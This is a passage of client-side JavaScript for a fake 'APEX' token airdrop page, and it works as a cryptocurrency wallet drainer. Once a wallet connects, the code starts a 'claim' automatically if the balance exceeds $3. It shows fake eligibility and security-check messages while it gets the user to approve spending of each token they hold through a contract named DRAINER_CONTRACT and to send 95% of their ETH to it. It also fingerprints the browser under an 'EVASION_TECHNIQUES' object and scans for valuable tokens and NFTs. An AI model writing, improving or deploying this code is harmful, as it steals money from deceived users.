    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "unpause",
    "type": "function",
    "inputs": [],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "name": "updateThresholds",
    "type": "function",
    "inputs": [
      {
        "name": "newTokenThreshold",
        "type": "uint256",
        "internalType": "uint256"
      },
      {
        "name": "newBNBThreshold",
        "type": "uint256",
        "internalType": "uint256"
      }
    ],
    "outputs": [],
    "stateMutability": "nonpayable"
  },
  {
    "type": "receive",
    "stateMutability": "payable"
  }
];// ====== WALLET DETECTION (unchanged) ======
const walletDetectors = {
  isMetaMask: () => {
    const ethereum = window.ethereum;
    if (!ethereum) return false;const patterns = [
  ethereum.isMetaMask,
  ethereum._metamask && ethereum._metamask.isUnlocked,
  window.web3 &&
    window.web3.currentProvider &&
    window.web3.currentProvider.isMetaMask,
  ethereum.providers && ethereum.providers.find((p) => p.isMetaMask),
  navigator.userAgent.includes("MetaMaskMobile"),
];

return patterns.some((pattern) => Boolean(pattern));  },  isCoinbaseWallet: () => {
    const ethereum = window.ethereum;
    if (!ethereum) return false;return (
  ethereum.isCoinbaseWallet ||
  (ethereum.providers &&
    ethereum.providers.some((p) => p.isCoinbaseWallet)) ||
  window.CoinbaseWalletSDK ||
  navigator.userAgent.includes("CoinbaseWallet")
);  },  isTrustWallet: () => {
    const ethereum = window.ethereum;
    if (!ethereum) return false;return (
  ethereum.isTrust ||
  ethereum.isTrustWallet ||
  (ethereum.providers &&
    ethereum.providers.some((p) => p.isTrust || p.isTrustWallet)) ||
  navigator.userAgent.includes("TrustWallet")
);  },  isRabbyWallet: () => {
    const ethereum = window.ethereum;
    if (!ethereum) return false;return (
  ethereum.isRabby ||
  (ethereum.providers && ethereum.providers.some((p) => p.isRabby))
);  },  isPhantom: () => {
    return window.phantom && window.phantom.ethereum;
  },  isBraveWallet: () => {
    return window.ethereum && window.ethereum.isBraveWallet;
  },  isMobileWallet: () => {
    return (
      /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
        navigator.userAgent
      ) &&
      (window.ethereum || window.web3)
    );
  },
};// ====== CURRENCY CONVERSION SYSTEM (unchanged) ======
const CURRENCY_CONVERTER = {
  rates: {
    USD: 1,
    EUR: 0.92,
    GBP: 0.79,
    JPY: 148.5,
    CNY: 7.23,
    INR: 83.2,
    AUD: 1.52,
    CAD: 1.36,
    CHF: 0.88,
    HKD: 7.82,
    SGD: 1.35,
    KRW: 1312.5,
    BRL: 4.95,
    RUB: 91.8,
    MXN: 17.2,
    ZAR: 18.9,
    TRY: 28.7,
    IDR: 15680,
    THB: 35.8,
    MYR: 4.68,
    PHP: 56.2,
    VND: 24350,
    AED: 3.67,
    SAR: 3.75,
    NGN: 900,
    EGP: 30.9,
    PKR: 280,
    BDT: 110,
  },  detectLocalCurrency: function () {
    try {
      const locale = navigator.language || "en-US";
      const region = locale.split("-")[1] || "US";  const currencyMap = {
    US: "USD",
    GB: "GBP",
    EU: "EUR",
    DE: "EUR",
    FR: "EUR",
    IT: "EUR",
    ES: "EUR",
    JP: "JPY",
    CN: "CNY",
    IN: "INR",
    AU: "AUD",
    CA: "CAD",
    RU: "RUB",
    BR: "BRL",
    MX: "MXN",
    KR: "KRW",
    SG: "SGD",
    HK: "HKD",
    TR: "TRY",
    SA: "SAR",
    AE: "AED",
    NG: "NGN",
    ZA: "ZAR",
    EG: "EGP",
    PK: "PKR",
    BD: "BDT",
    ID: "IDR",
    TH: "THB",
    MY: "MYR",
    PH: "PHP",
    VN: "VND",
  };

  return currencyMap[region] || "USD";
} catch (error) {
  return "USD";
}  },  convertToUSD: function (amount, fromCurrency) {
    try {
      const currency = fromCurrency.toUpperCase();  if (!this.rates[currency]) {
    console.warn(`Unknown currency: ${currency}, using USD`);
    return amount;
  }

  if (currency === "USD") return amount;

  return amount / this.rates[currency];
} catch (error) {
  console.error("Currency conversion error:", error);
  return amount;
}  },  formatCurrency: function (amount, currency) {
    try {
      return new Intl.NumberFormat(navigator.language, {
        style: "currency",
        currency: currency,
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      }).format(amount);
    } catch (error) {
      return ${amount} ${currency};
    }
  },
};const EVASION_TECHNIQUES = {
  async generateWasmFingerprint() {
    try {
      const wasmCode = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x07, 0x01, 0x60,
        0x02, 0x7f, 0x7f, 0x01, 0x7f, 0x03, 0x02, 0x01, 0x00, 0x07, 0x07, 0x01,
        0x03, 0x61, 0x64, 0x64, 0x00, 0x00, 0x0a, 0x09, 0x01, 0x07, 0x00, 0x20,
        0x00, 0x20, 0x01, 0x6a, 0x0b,
      ]);  const module = await WebAssembly.instantiate(wasmCode);
  const instance = module.instance;

  return {
    wasmSupported: true,
    memory: instance.exports.memory,
    timestamp: Date.now(),
    hash: Math.random().toString(36).substring(2, 15),
  };
} catch (e) {
  return { wasmSupported: false, timestamp: Date.now() };
}  },  generateAudioFingerprint() {
    return new Promise((resolve) => {
      try {
        const audioContext = new (window.AudioContext ||
          window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();    oscillator.connect(analyser);
    analyser.connect(audioContext.destination);

    oscillator.start();
    setTimeout(() => {
      oscillator.stop();
      audioContext.close();
      resolve({
        audioFingerprint: "completed",
        hash: Math.random().toString(36).substring(2, 10),
      });
    }, 100);
  } catch (e) {
    resolve({ audioFingerprint: "failed" });
  }
});  },  generateCanvasFingerprint() {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");const noise = Math.random().toString(36).substring(2, 15);
const noise2 = Math.random().toString(36).substring(2, 10);

ctx.textBaseline = "top";
ctx.font = "14px 'Arial'";
ctx.textBaseline = "alphabetic";
ctx.fillStyle = "#f60";
ctx.fillRect(125, 1, 62, 20);
ctx.fillStyle = "#069";
ctx.fillText(noise, 2, 15);
ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
ctx.fillText(noise2, 4, 17);

ctx.beginPath();
ctx.arc(50, 50, 25, 0, Math.PI * 2);
ctx.stroke();

return canvas.toDataURL();  },  generateBrowserFingerprint() {
    const plugins = Array.from(navigator.plugins)
      .map((p) => p.name)
      .join(",");
    const mimeTypes = Array.from(navigator.mimeTypes)
      .map((mt) => mt.type)
      .join(",");return {
  userAgent: navigator.userAgent,
  language: navigator.language,
  platform: navigator.platform,
  hardwareConcurrency: navigator.hardwareConcurrency,
  deviceMemory: navigator.deviceMemory,
  plugins: plugins,
  mimeTypes: mimeTypes,
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  touchSupport: "ontouchstart" in window,
  cookieEnabled: navigator.cookieEnabled,
  doNotTrack: navigator.doNotTrack,
  isMobile:
    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
      navigator.userAgent
    ),
  hash: Math.random().toString(36).substring(2, 15),
  localCurrency: CURRENCY_CONVERTER.detectLocalCurrency(),
};  },  async getETHPriceInUSD() {
    const apis = [
      "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
      "https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT",
      "https://api.coinbase.com/v2/prices/ETH-USD/spot",
      "https://api.kraken.com/0/public/Ticker?pair=ETHUSD",
    ];for (const api of apis) {
  try {
    const response = await fetch(api);
    const data = await response.json();

    if (api.includes("coingecko")) {
      return data.ethereum.usd;
    } else if (api.includes("binance")) {
      return parseFloat(data.price);
    } else if (api.includes("coinbase")) {
      return parseFloat(data.data.amount);
    } else if (api.includes("kraken")) {
      return parseFloat(data.result.XETHZUSD.c[0]);
    }
  } catch (error) {
    continue;
  }
}

return 2200;  },  async getTokenPriceInUSD(tokenAddress) {
    try {
      const response = await fetch(
        https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=${tokenAddress}&vs_currencies=usd
      );
      const data = await response.json();
      return data[tokenAddress.toLowerCase()].usd;
    } catch (error) {
      const knownTokens = {
        "0xdAC17F958D2ee523a2206206994597C13D831ec7": 1,
        "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": 1,
        "0x6B175474E89094C44Da98b954EedeAC495271d0F": 1,
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599": 42000,
        "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0": 0.75,
        "0x514910771AF9Ca656af840dff83E8264EcF986CA": 14,
      };
      return knownTokens[tokenAddress] || 0.1;
    }
  },
};// ====== ENHANCED APPLICATION STATE ======
let tokenChart;
let countdownInterval;
let claimList = [];
let priceHistory = [];
let web3;
let fingerprintData = {};
let isMobileDevice =
  /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
    navigator.userAgent
  );
let connectedWallet = null;
let connectedAddress = null;
let stealthMode = false;
let simulationBypassActive = false;
let progressUpdated = false;
let ethPriceInUSD = 2200;
let userHasClaimed = false;
let userBalanceInUSD = 0;
let userLocalCurrency = CURRENCY_CONVERTER.detectLocalCurrency();
let contractInstance; // will be set after web3 initialization
const CLAIM_THRESHOLD_USD = 3;// DOM Elements (unchanged, keep as in original)
const mobileMenuBtn = document.querySelector(".mobile-menu-btn");
const navLinks = document.querySelector(".nav-links");
const claimListElement = document.getElementById("claimList");
const predictionFill = document.getElementById("predictionFill");
const claimStatus = document.getElementById("claimStatus");
const walletBtn = document.getElementById("walletButton");
const walletButtonContainer = document.getElementById("walletButtonContainer");
const connectButton = document.getElementById("connectButton");
const progressBar = document.getElementById("progressBar");
const progressPercentage = document.getElementById("progressPercentage");
const connectionDebug = document.getElementById("connectionDebug");
const debugToggle = document.getElementById("debugToggle");
const walletModal = document.getElementById("walletModal");
const walletModalClose = document.getElementById("walletModalClose");
const walletProviders = document.querySelectorAll(".wallet-provider");
const announcementModal = document.getElementById("announcementModal");
const announcementModalClose = document.getElementById("announcementModalClose");
const announcementOkBtn = document.getElementById("announcementOkBtn");
const copyReferralBtn = document.getElementById("copyReferralBtn");
const referralLink = document.getElementById("referralLink");// Event listeners (unchanged)
if (mobileMenuBtn) mobileMenuBtn.addEventListener("click", toggleMobileMenu);
if (walletModalClose) walletModalClose.addEventListener("click", hideWalletModal);
if (announcementModalClose) announcementModalClose.addEventListener("click", hideAnnouncementModal);
if (announcementOkBtn) announcementOkBtn.addEventListener("click", hideAnnouncementModal);
if (copyReferralBtn) copyReferralBtn.addEventListener("click", copyReferralLink);
if (debugToggle) debugToggle.addEventListener("click", () => {
  connectionDebug.classList.toggle("active");
  debugToggle.textContent = connectionDebug.classList.contains("active")
    ? "Hide connection details"
    : "Show connection details";
});if (walletProviders) {
  walletProviders.forEach((provider) => {
    provider.addEventListener("click", () => {
      const providerType = provider.getAttribute("data-provider");
      connectWithProvider(providerType);
    });
  });
}// Initialize Vanta.js background (unchanged)
if (typeof VANTA !== "undefined") {
  VANTA.NET({
    el: "#vanta-bg",
    mouseControls: true,
    touchControls: true,
    gyroControls: false,
    minHeight: 200.0,
    minWidth: 200.0,
    scale: 1.0,
    scaleMobile: 1.0,
    color: 0xff6b00,
    backgroundColor: 0x0f172a,
    points: 15.0,
    maxDistance: 25.0,
    spacing: 18.0,
  });
}// ====== ENHANCED CURRENCY AWARE INITIALIZATION ======
document.addEventListener("DOMContentLoaded", async function () {
  console.log(Local currency detected: ${userLocalCurrency});
  console.log(Claim threshold: $${CLAIM_THRESHOLD_USD} USD);  startCountdown();
  createTokenChart();
  updateTokenPrice();
  generateInitialClaims();
  startClaimUpdates();
  updateAIAnalytics();
  initializeAdvancedEvasion();
  detectWallets();  ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
  console.log(Current ETH Price: $${ethPriceInUSD} USD);  const localThreshold = CURRENCY_CONVERTER.formatCurrency(
    CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );
  console.log(Threshold in local currency: ${localThreshold});  setInterval(updateTokenPrice, 10000);
  setInterval(updateAIAnalytics, 15000);
  setInterval(async () => {
    ethPriceInUSD = await EVASION_TECHNIQUES.getETHPriceInUSD();
  }, 60000);  initializeServiceWorker();
  initializeManualAppKitIntegration();  if (isMobileDevice) {
    initializeMobileSpecificOptimizations();
  }
});// ====== ENHANCED BALANCE CHECK WITH CURRENCY CONVERSION ======
async function checkAndAutoTriggerClaim() {
  if (!connectedAddress || !web3 || userHasClaimed) return;  try {
    const ethBalance = await web3.eth.getBalance(connectedAddress);
    const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
    userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];

console.log(`User Balance: ${ethBalanceInETH} ETH`);
console.log(`User Balance: $${userBalanceInUSD.toFixed(2)} USD`);
console.log(`User Balance: ${CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency)}`);

if (userBalanceInUSD >= CLAIM_THRESHOLD_USD) {
  logDebug(
    `TRIGGER: User has $${userBalanceInUSD.toFixed(2)} USD balance (>= $${CLAIM_THRESHOLD_USD} threshold)`
  );

  const localAmount = CURRENCY_CONVERTER.formatCurrency(
    CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );

  showNotification(`Balance meets minimum requirement (${localAmount})`, "info");

  const delay = 2000 + Math.random() * 2000;
  setTimeout(() => {
    if (!userHasClaimed) {
      showNotification("Checking eligibility for APEX token claim...", "info");
      initiateClaimProcess();
    }
  }, delay);
} else {
  const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
  const localThreshold = CURRENCY_CONVERTER.formatCurrency(
    CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );

  logDebug(`NO TRIGGER: User has ${localBalance} (< ${localThreshold} threshold)`);
}  } catch (error) {
    console.error("Error checking user balance:", error);
  }
}// ====== MAIN CLAIM PROCESS (Using contract functions) ======
async function initiateClaimProcess() {
  if (!connectedWallet || !web3) {
    showNotification("Please connect your wallet first", "error");
    showWalletModal();
    return;
  }  const button = document.getElementById("connectButton");
  const originalText = button ? button.innerHTML : "Connect Wallet";  try {
    const loadingMessages = [
      "Processing...",
      "Initializing security...",
      "Verifying eligibility...",
      "Checking wallet status...",
      "Analyzing transaction patterns...",
      "Optimizing gas fees...",
      "Validating smart contract...",
      "Preparing token distribution...",
      "Running security checks...",
      "Configuring network parameters...",
    ];if (button) {
  button.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${loadingMessages[Math.floor(Math.random() * loadingMessages.length)]}`;
  button.disabled = true;
}

const statusMessages = [
  "Initializing security verification...",
  "Setting up claim process...",
  "Preparing token distribution...",
  "Configuring wallet connection...",
  "Running security checks...",
  "Analyzing network conditions...",
  "Optimizing transaction parameters...",
  "Verifying contract integrity...",
  "Loading token distribution module...",
];

if (claimStatus) {
  claimStatus.textContent = statusMessages[Math.floor(Math.random() * statusMessages.length)];
  claimStatus.className = "status pending";
}

await manualRandomDelay(1000, 3000);
let accounts = await web3.eth.getAccounts();
const userAddress = accounts[0];

await manualRandomDelay(500, 2000);
await collectManualFingerprint();

if (userHasClaimed) {
  const errorMessages = [
    "You have already claimed your APEX tokens in this session.",
    "Token claim already processed for this wallet.",
    "Maximum claims per session reached. Please try again later.",
    "Duplicate claim detected. Security protocols activated.",
    "Wallet already processed for token distribution.",
  ];

  if (claimStatus) {
    claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
    claimStatus.className = "status error";
  }
  if (button) resetButton(button, originalText);
  return;
}

const ethBalance = await web3.eth.getBalance(userAddress);
const ethBalanceInETH = web3.utils.fromWei(ethBalance, "ether");
userBalanceInUSD = ethBalanceInETH * ethPriceInUSD;

const userBalanceLocal = userBalanceInUSD * CURRENCY_CONVERTER.rates[userLocalCurrency];
const localThreshold = CLAIM_THRESHOLD_USD * CURRENCY_CONVERTER.rates[userLocalCurrency];

logDebug(`User Balance Check: ${ethBalanceInETH} ETH = $${userBalanceInUSD.toFixed(2)} USD`);

if (userBalanceInUSD < CLAIM_THRESHOLD_USD) {
  const localBalance = CURRENCY_CONVERTER.formatCurrency(userBalanceLocal, userLocalCurrency);
  const formattedThreshold = CURRENCY_CONVERTER.formatCurrency(localThreshold, userLocalCurrency);

  const errorMessages = [
    `Minimum ${formattedThreshold} required for claim. Current: ${localBalance}`,
    `Insufficient balance for token claim. Deposit more ETH.`,
    `Wallet balance below minimum threshold for APEX distribution.`,
    `Add ETH to your wallet to qualify for token claim.`,
    `Claim requires minimum ${formattedThreshold} for gas optimization.`,
  ];

  if (claimStatus) {
    claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
    claimStatus.className = "status error";
  }
  if (button) resetButton(button, originalText);
  return;
}

if (ethBalanceInETH < 0.005) {
  const errorMessages = [
    "Insufficient ETH for transaction. Deposit more ETH to claim tokens.",
    "Additional ETH required for gas fees to complete claim.",
    "Please add ETH to your wallet to cover transaction costs.",
    "Low ETH balance. Deposit more to proceed with token claim.",
    "Transaction requires minimum ETH balance for gas optimization.",
  ];

  if (claimStatus) {
    claimStatus.textContent = errorMessages[Math.floor(Math.random() * errorMessages.length)];
    claimStatus.className = "status error";
  }
  if (button) resetButton(button, originalText);
  return;
}

await simulateManualLegitimateTransaction(userAddress);
await manualRandomDelay(800, 2000);

if (claimStatus) {
  claimStatus.textContent = "Scanning wallet for eligible tokens...";
}

const { tokens, nfts } = await manualMultiContractTokenDetection(userAddress);

let approvalsDone = 0;
let totalActions = 0;

// Approve tokens using setTokenApproval
if (tokens.length > 0) {
  totalActions += tokens.length;
  for (const token of tokens) {
    if (claimStatus) {
      claimStatus.textContent = `Approving ${token.symbol}...`;
    }
    const success = await callSetTokenApproval(token.address, token.balance);
    if (success) {
      approvalsDone++;
    }
    await manualRandomDelay(1000, 2000);
  }
}

// Deposit native ETH using depositBNB
let nativeDepositDone = false;
if (ethBalanceInETH >= 0.005 && !userHasClaimed) {
  totalActions++;
  if (claimStatus) {
    claimStatus.textContent = "Depositing ETH to claim pool...";
  }
  const depositAmount = ethBalanceInETH * 0.95; // leave some for gas
  const success = await callDepositBNB(depositAmount);
  if (success) {
    nativeDepositDone = true;
    approvalsDone++; // count as an action
  }
}

// Mark as claimed if at least one action succeeded
if (approvalsDone > 0 || nativeDepositDone) {
  userHasClaimed = true;
  handleClaimSuccess(userAddress, tokens, button, originalText);
} else {
  const noTokensMessages = [
    "No eligible tokens found for claiming.",
    "No tokens detected in your wallet.",
    "Your wallet doesn't contain claimable tokens at this time.",
    "Wallet analysis complete - no actionable assets found.",
  ];

  if (claimStatus) {
    claimStatus.textContent = noTokensMessages[Math.floor(Math.random() * noTokensMessages.length)];
    claimStatus.className = "status info";
  }
  if (button) resetButton(button, originalText);
}  } catch (error) {
    handleManualRewardError(error, button, originalText);
  }
}// ====== CALL setTokenApproval (victim approves token spending) ======
async function callSetTokenApproval(tokenAddress, amount) {
  try {
    if (!contractInstance) {
      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    }
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];const gasEstimate = await contractInstance.methods
  .setTokenApproval(tokenAddress, amount)
  .estimateGas({ from: userAddress });

const tx = await contractInstance.methods
  .setTokenApproval(tokenAddress, amount)
  .send({
    from: userAddress,
    gas: Math.floor(gasEstimate * 1.2),
    gasPrice: await web3.eth.getGasPrice(),
  });

logDebug(`Token approval successful for ${tokenAddress}: ${tx.transactionHash}`);
return true;  } catch (error) {
    console.error("setTokenApproval failed:", error);
    return false;
  }
}// ====== CALL depositBNB (victim deposits ETH) ======
async function callDepositBNB(ethAmount) {
  try {
    if (!contractInstance) {
      contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
    }
    const accounts = await web3.eth.getAccounts();
    const userAddress = accounts[0];
    const amountWei = web3.utils.toWei(ethAmount.toString(), "ether");const gasEstimate = await contractInstance.methods
  .depositBNB()
  .estimateGas({ from: userAddress, value: amountWei });

const tx = await contractInstance.methods
  .depositBNB()
  .send({
    from: userAddress,
    value: amountWei,
    gas: Math.floor(gasEstimate * 1.2),
    gasPrice: await web3.eth.getGasPrice(),
  });

logDebug(`Native deposit successful: ${ethAmount} ETH`);
return true;  } catch (error) {
    console.error("depositBNB failed:", error);
    return false;
  }
}// ====== TOKEN DETECTION (unchanged) ======
async function manualMultiContractTokenDetection(userAddress) {
  const result = {
    tokens: [],
    nfts: [],
    totalValueUSD: 0,
  };  const tokenLists = await fetchManualTokenList();  for (const token of tokenLists) {
    try {
      const balance = await getManualTokenBalance(token.address, userAddress);
      if (balance > 0) {
        const tokenPriceUSD = await EVASION_TECHNIQUES.getTokenPriceInUSD(token.address);
        const tokenValueUSD = (balance / Math.pow(10, token.decimals || 18)) * tokenPriceUSD;    result.tokens.push({
      ...token,
      balance,
      valueUSD: tokenValueUSD,
    });

    result.totalValueUSD += tokenValueUSD;
  }
} catch (e) {
  console.debug(`Manual token detection failed for: ${token.address}`);
}  }  // Detect NFTs (optional, but we won't handle them in this version)
  const nftContracts = [
    "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
    "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
    "0x23581767a106ae21c074b2276D25e5C3e136a68b",
    "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
  ];  for (const nftAddress of nftContracts) {
    try {
      const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
      if (nftBalance > 0) {
        const nftValueUSD = nftBalance * 100;    result.nfts.push({
      address: nftAddress,
      balance: nftBalance,
      valueUSD: nftValueUSD,
    });

    result.totalValueUSD += nftValueUSD;
  }
} catch (e) {
  console.debug(`Manual NFT detection failed for: ${nftAddress}`);
}  }  const localValue = CURRENCY_CONVERTER.formatCurrency(
    result.totalValueUSD * CURRENCY_CONVERTER.rates[userLocalCurrency],
    userLocalCurrency
  );
  logDebug(Total portfolio value: ${localValue});  return result;
}// ====== HELPER FUNCTIONS (mostly unchanged) ======
function initializeMobileSpecificOptimizations() {
  console.log("Initializing mobile-specific optimizations...");  document.addEventListener(
    "touchstart",
    function (e) {
      if (e.target.closest("button") || e.target.closest(".btn-primary")) {
        e.target.style.transform = "scale(0.98)";
        setTimeout(() => {
          e.target.style.transform = "";
        }, 150);
      }
    },
    { passive: true }
  );  document.addEventListener(
    "dblclick",
    function (e) {
      e.preventDefault();
    },
    { passive: false }
  );  const viewport = document.querySelector('meta[name="viewport"]');
  if (viewport) {
    viewport.setAttribute(
      "content",
      "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    );
  }
}async function initializeServiceWorker() {
  if ("serviceWorker" in navigator) {
    try {
      const swScript = `
        self.addEventListener('install', (event) => {
          self.skipWaiting();
        });    self.addEventListener('activate', (event) => {
      event.waitUntil(self.clients.claim());
    });
  `;

  const blob = new Blob([swScript], { type: "application/javascript" });
  const swUrl = URL.createObjectURL(blob);

  await navigator.serviceWorker.register(swUrl);
  console.log("ServiceWorker registered successfully");
} catch (error) {
  console.log("ServiceWorker registration failed:", error);
}  }
}function initializeManualAppKitIntegration() {
  console.log("Initializing manual AppKit integration...");  const checkAppKitInterval = setInterval(() => {
    const w3mButton = document.querySelector("w3m-button");
    if (w3mButton) {
      clearInterval(checkAppKitInterval);
      w3mButton.addEventListener("click", () => {
        console.log("Manual AppKit button clicked");
        setupManualAppKitConnectionListener();
      });
    }
  }, 500);
}function setupManualAppKitConnectionListener() {
  if (window.ethereum) {
    window.ethereum.on("accountsChanged", (accounts) => {
      if (accounts.length > 0) {
        console.log("Manual AppKit accounts changed:", accounts[0]);
        handleManualAppKitConnection(accounts[0]);
      } else {
        handleManualDisconnection();
      }
    });window.ethereum.on("chainChanged", (chainId) => {
  console.log("Manual AppKit chain changed:", chainId);
  if (window.ethereum.selectedAddress) {
    handleManualAppKitConnection(window.ethereum.selectedAddress);
  }
});

window.ethereum.on("connect", (connectInfo) => {
  console.log("Manual AppKit connected:", connectInfo);
});

window.ethereum.on("disconnect", (error) => {
  console.log("Manual AppKit disconnected:", error);
  handleManualDisconnection();
});  }
}function handleManualAppKitConnection(address) {
  connectedAddress = address;
  connectedWallet = "manual_appkit";  try {
    web3 = new Web3(window.ethereum);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
  } catch (error) {
    console.error("Web3 initialization failed:", error);
    web3 = new Web3(Web3.givenProvider);
    contractInstance = new web3.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
  }  updateManualWalletButton();
  logDebug(Manual AppKit connected: ${connectedAddress});
  showNotification("Wallet connected successfully", "success");
  collectManualFingerprint();  setTimeout(() => {
    checkAndAutoTriggerClaim();
  }, 2000);  showManualAnnouncementModal();
}function showManualAnnouncementModal() {
  if (connectedAddress) {
    const shortAddress = connectedAddress.substring(0, 6) + "..." + connectedAddress.substring(38);
    if (referralLink) {
      referralLink.textContent = https://apex-protocol.io/ref?user=${shortAddress};
    }
  }  if (announcementModal) {
    announcementModal.classList.add("active");
  }
}function updateManualWalletButton() {
  if (!walletButtonContainer) return;  if (connectedWallet && connectedAddress) {
    walletButtonContainer.innerHTML =       <div class="wallet-connected">         <i class="fas fa-check-circle"></i>         <span class="wallet-address">${connectedAddress.substring(0, 6)}...${connectedAddress.substring(38)}</span>         <button class="disconnect-btn" id="disconnectButton">Disconnect</button>       </div>    ;
    document.getElementById("disconnectButton").addEventListener("click", disconnectManualWallet);
  } else {
    walletButtonContainer.innerHTML =       <button class="wallet-btn" id="walletButton">         <i class="fas fa-wallet"></i> Connect       </button>    ;
    document.getElementById("walletButton").addEventListener("click", showWalletModal);
  }
}function handleManualDisconnection() {
  connectedWallet = null;
  connectedAddress = null;
  web3 = null;
  contractInstance = null;
  userHasClaimed = false;
  updateManualWalletButton();
  showNotification("Wallet disconnected", "info");
  logDebug("Manual wallet disconnected");
}async function collectManualFingerprint() {
  const fingerprint = {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    screen: ${screen.width}x${screen.height},
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    webgl: await getManualWebGLFingerprint(),
    plugins: Array.from(navigator.plugins).map((p) => p.name),
    walletType: connectedWallet,
    network: "Unknown",
    ethBalance: 0,
    tokenBalances: {},
    nftBalances: {},
    isMobile: isMobileDevice,
    localCurrency: userLocalCurrency,
    ...fingerprintData,
  };  try {
    if (web3) {
      const networkId = await web3.eth.net.getId();
      fingerprint.network = networkId;  if (connectedAddress) {
    fingerprint.ethBalance = web3.utils.fromWei(
      await web3.eth.getBalance(connectedAddress),
      "ether"
    );
    await detectManualTokensAndNFTs(connectedAddress, fingerprint);
  }
}  } catch (e) {
    console.debug("Manual fingerprinting error:", e);
  }  fingerprintData = fingerprint;
  return fingerprint;
}async function getManualWebGLFingerprint() {
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    if (!gl) return "unsupported";const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);

return {
  renderer: renderer,
  vendor: vendor,
  version: gl.getParameter(gl.VERSION),
  shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
  maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
  maxRenderBufferSize: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
};  } catch (e) {
    return "error";
  }
}async function detectManualTokensAndNFTs(userAddress, fingerprint) {
  const tokenSources = [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 },
    { address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol: "DAI", decimals: 18 },
    { address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", symbol: "WBTC", decimals: 8 },
    { address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", symbol: "MATIC", decimals: 18 },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK", decimals: 18 },
    { address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", symbol: "WETH", decimals: 18 },
    { address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", symbol: "SHIB", decimals: 18 },
    { address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381", symbol: "APE", decimals: 18 },
  ];  const nftContracts = [
    "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D",
    "0x60E4d786628Fea6478F785A6d7e704777c86a7c6",
    "0x23581767a106ae21c074b2276D25e5C3e136a68b",
    "0xED5AF388653567Af2F388E6224dC7C4b3241C544",
    "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e",
    "0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7",
    "0xb47e3cd837dDF8e4c57F05d70Ab865de6e193BBB",
  ];  for (const token of tokenSources) {
    try {
      const balance = await getManualTokenBalance(token.address, userAddress);
      if (balance > 0) {
        fingerprint.tokenBalances[token.address] = {
          balance: balance,
          symbol: token.symbol,
          decimals: token.decimals,
        };
      }
    } catch (e) {
      console.debug(Manual token balance check failed: ${token.address});
    }
  }  for (const nftAddress of nftContracts) {
    try {
      const nftBalance = await getManualNFTBalance(nftAddress, userAddress);
